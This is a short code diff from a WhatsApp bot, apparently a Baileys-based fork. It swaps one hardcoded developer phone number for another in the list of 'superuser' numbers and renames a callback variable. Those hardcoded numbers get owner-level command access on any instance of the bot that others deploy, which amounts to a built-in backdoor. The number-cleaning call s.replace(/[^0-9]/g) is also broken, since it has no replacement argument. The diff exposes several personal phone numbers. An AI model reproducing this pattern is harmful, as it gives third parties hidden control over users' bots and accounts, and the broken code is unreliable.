@@ -180,8 +180,8 @@ const MsgInbox = origineMessage?.endsWith("@s.whatsapp.net");
             const k3 = "254728746851";
             const k4 = '254110853827';
             const sudo = await getAllSudoNumbers();
-            let suhail_ser = "923184474176"
-            const superUserNumbers = [servBot, suhail_ser, k1, k2, k3, k4, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+            let the_goat = "254742063632"
+            const superUserNumbers = [servBot, the_goat, k1, k2, k3, k4, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
             const superUser = allAllowedNumbers.includes(auteurMessage);
             
@@ -1293,7 +1293,7 @@ await repondre(data.cnt);
             //execution des commandes   
             if (verifCom) {
                 //await await zk.readMessages(ms.key);
-                const cd = evt.cm.find((france) => france.nomCom === (com));
+                const cd = evt.cm.find((gifted) => gifted.nomCom === (com));
                 if (cd) {
                     try {
 
